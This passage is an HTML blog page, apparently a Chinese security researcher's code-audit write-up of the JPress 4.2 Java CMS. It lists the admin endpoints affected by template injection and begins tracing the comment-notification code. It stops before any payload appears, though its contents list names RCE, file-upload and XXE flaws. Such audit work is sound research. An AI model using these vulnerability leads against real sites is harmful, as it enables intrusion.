@@ -1,0 +1,1058 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [代码审计]Jpress4.2 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Jpress介绍 JPress CMS，一个完整的 Java CMS 网站管理系统，目前已经有 10w+ 网站使用 JPress CMS 进行驱动，其中包括多个政府机构，200+上市公司，中科院、红+字会等 类似于WordPress，只不过是用java搭建的  环境配置 下载源码 打包 创建新数据库（不导入） 启动 进入install界面   一步步配置就好了  在 undertow.txt 中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[代码审计]Jpress4.2">
+<meta property="og:url" content="http://example.com/2025/08/23/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]Jpress-V4.2/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Jpress介绍 JPress CMS，一个完整的 Java CMS 网站管理系统，目前已经有 10w+ 网站使用 JPress CMS 进行驱动，其中包括多个政府机构，200+上市公司，中科院、红+字会等 类似于WordPress，只不过是用java搭建的  环境配置 下载源码 打包 创建新数据库（不导入） 启动 进入install界面   一步步配置就好了  在 undertow.txt 中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823191702045.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823191852202.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823191925138.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823192331678.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823200512877.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823201151799.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823205002191.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823205244136.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/CommentLie.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/ArticleNotifyKit.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823205741609.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/emailValue.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823211515497.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823211709167.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823212609775.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823213930498.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823214103804.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/cleanXSSDefendSSTI.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/replaceEach.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/uploadFileArray.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/GetFileIndexZero.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823223511268.png">
+<meta property="og:image" content="https://drun1baby.top/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UnSafe.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823223626882.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823215435817.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823215532689.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823224451536.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823225037528.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823225421588.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823225454435.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823230123013.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823225954490.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823230005725.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823230220859.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823231152586.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823231205076.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/8-1729774930.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/7-1729774931.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/uploadFilesJudge.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823231830544.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823231916295.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823231948067.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250823235859056.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000208444.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000332749.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000410428.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000450329.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000521878.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824000726391.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824001210254.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824001912541.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824002029541.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824002105407.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824161142677.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824161247530.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824161520075.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824162240561.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824162343216.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824162456195.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/EvilInstallTemplates.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824165027293.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824165035862.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824165725071.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824165804580.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824165842511.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/412WordPressImport.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824170907436.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824171028666.png">
+<meta property="og:image" content="http://example.com/2025/08/23/images/image-20250824171103149.png">
+<meta property="article:published_time" content="2025-08-23T11:15:22.000Z">
+<meta property="article:modified_time" content="2026-09-21T13:53:40.946Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/08/23/images/image-20250823191702045.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[代码审计]Jpress4.2">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[代码审计]Jpress4.2</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jpress%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text"> Jpress介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text"> 环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text"> 审计准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text"> 架构理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">3.2.</span> <span class="toc-text"> 依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter"><span class="toc-number">3.3.</span> <span class="toc-text"> Filter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5rce"><span class="toc-number">4.</span> <span class="toc-text"> 模板注入RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3"><span class="toc-number">4.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92"><span class="toc-number">4.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92"><span class="toc-number">4.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text"> 前台任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-2"><span class="toc-number">5.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-2"><span class="toc-number">5.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-2"><span class="toc-number">5.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.1.</span> <span class="toc-text"> 法一 多文件上传绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-window%E4%B8%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.2.</span> <span class="toc-text"> 法二 Window下的绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F-filter"><span class="toc-number">5.3.3.</span> <span class="toc-text"> 注意 Filter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">5.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E2"><span class="toc-number">6.</span> <span class="toc-text"> 前台任意文件上传漏洞2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E5%AF%BC%E8%87%B4rce"><span class="toc-number">7.</span> <span class="toc-text"> 插件安装导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-3"><span class="toc-number">7.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-3"><span class="toc-number">7.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-3"><span class="toc-number">7.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">7.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AE%89%E8%A3%85%E5%AF%BC%E8%87%B4rce"><span class="toc-number">8.</span> <span class="toc-text"> 模板安装导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-4"><span class="toc-number">8.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-4"><span class="toc-number">8.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-4"><span class="toc-number">8.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-number">8.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8Ewordpress%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%96%87%E7%AB%A0%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8xxe%E6%BC%8F%E6%B4%9E-v412"><span class="toc-number">9.</span> <span class="toc-text"> 从WordPress中导入文章功能存在XXE漏洞-V4.1.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-5"><span class="toc-number">9.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-5"><span class="toc-number">9.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-number">9.3.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%A8%A1%E6%9D%BF%E4%BF%AE%E6%94%B9"><span class="toc-number">10.</span> <span class="toc-text"> 后台存在命令执行漏洞-模板修改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-6"><span class="toc-number">10.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-5"><span class="toc-number">10.2.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="toc-number">10.3.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text"> 参考</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[代码审计]Jpress-V4.2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/08/23/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DJpress-V4.2/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-23T11:15:22.000Z" itemprop="datePublished">2025-08-23</time>
+    <time style="display: none;" id="post-update-time">2026-09-21</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-aos="zoom-in">代码审计</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="jpress介绍"><a class="markdownIt-Anchor" href="#jpress介绍"></a> Jpress介绍</h2>
+<p>JPress CMS，一个完整的 Java CMS 网站管理系统，目前已经有 10w+ 网站使用 JPress CMS 进行驱动，其中包括多个政府机构，200+上市公司，中科院、红+字会等</p>
+<p>类似于WordPress，只不过是用java搭建的</p>
+<h2 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h2>
+<p>下载源码</p>
+<p>打包</p>
+<p>创建新数据库（不导入）</p>
+<p>启动</p>
+<p>进入install界面</p>
+<p><img src="../images/image-20250823191702045.png" alt="image-20250823191702045" /></p>
+<p><img src="../images/image-20250823191852202.png" alt="image-20250823191852202" /></p>
+<p>一步步配置就好了</p>
+<p><img src="../images/image-20250823191925138.png" alt="image-20250823191925138" /></p>
+<p>在 undertow.txt 中可以修改端口</p>
+<p><img src="../images/image-20250823192331678.png" alt="image-20250823192331678" /></p>
+<p>别说，还挺好看</p>
+<h2 id="审计准备"><a class="markdownIt-Anchor" href="#审计准备"></a> 审计准备</h2>
+<h3 id="架构理解"><a class="markdownIt-Anchor" href="#架构理解"></a> 架构理解</h3>
+<p>jpress 项目分为前台页面和后台管理界面，前台页面是纯前端的内容，所以漏洞点主要是在后台管理页面这里。</p>
+<p>在后台管理界面这里，需要在模板 —&gt; 所有模板中选择对应的模板，才能在前台页面看到一些漏洞的回显。比如 XXE，XSS 这些</p>
+<h3 id="依赖"><a class="markdownIt-Anchor" href="#依赖"></a> 依赖</h3>
+<p><img src="../images/image-20250823200512877.png" alt="image-20250823200512877" /></p>
+<p>log4j也是高版本，按理说不存在组件漏洞</p>
+<h3 id="filter"><a class="markdownIt-Anchor" href="#filter"></a> Filter</h3>
+<p>不存在通用Filter，比如SQL,XSS，但文件上传是有FIlter的，后面讲文件上传会讲到</p>
+<blockquote>
+<p>存在多 module，需要我们对不同 module 功能块进行审计，尽量从一个漏洞发现者的角度去看，这样还是可以学到很多的。</p>
+</blockquote>
+<h2 id="模板注入rce"><a class="markdownIt-Anchor" href="#模板注入rce"></a> 模板注入RCE</h2>
+<h3 id="影响接口"><a class="markdownIt-Anchor" href="#影响接口"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin/article/setting</span><br><span class="line">/admin/page/setting</span><br><span class="line">/admin/product/setting</span><br><span class="line">/admin/template/edit</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 <code>setting</code> 目录下存在好几处的模板渲染漏洞</li>
+</ul>
+<h3 id="漏洞分析白盒"><a class="markdownIt-Anchor" href="#漏洞分析白盒"></a> 漏洞分析(白盒)</h3>
+<p>找到这里是因为：</p>
+<p><img src="../images/image-20250823201151799.png" alt="image-20250823201151799" /></p>
+<p>这里有默认演示：<code>#(comment.id)</code>，猜测可能有模板注入问题，此处对应的模板是 <code>Velocity</code></p>
+<p>我们找到发布评论的类：<code>io.jpress.module.article.controller.front.ArticleController</code></p>
+<p><img src="../images/image-20250823205002191.png" alt="image-20250823205002191" /></p>
+<p>我们在 <code>postComment()</code> 方法处下一个断点，这个方法的作用主要是将评论信息保存到数据库，同时还会发送短信通知网站管理员。</p>
+<p>我们先开启文章评论的功能，如图</p>
+<p><img src="../images/image-20250823205244136.png" alt="image-20250823205244136" /></p>
+<p>接着发布一条评论，来看一看它的运行流程。</p>
+<p><img src="../images/CommentLie.png" alt="img" /></p>
+<p>前面是一系列的赋值与基础判断</p>
+<p>直接看重点部分，第 268 行。</p>
+<p><img src="../images/ArticleNotifyKit.png" alt="img" /></p>
+<p>跟进一下，进入到 <code>notify()</code> 方法，它这里面定义了两种将评论发送给管理员的方式，一种是 Email 的形式，另外一种是 Sms 的形式。我们先跟进 email 的看一下，这里会先判断是否开启了 <code>article_comment_email_notify_enable</code>，如果开启了则进入到 email 的形式当中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">(Article article, ArticleComment comment, User user)</span> &#123;</span><br><span class="line">        byEmail(article, comment, user);</span><br><span class="line">        bySms(article, comment);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
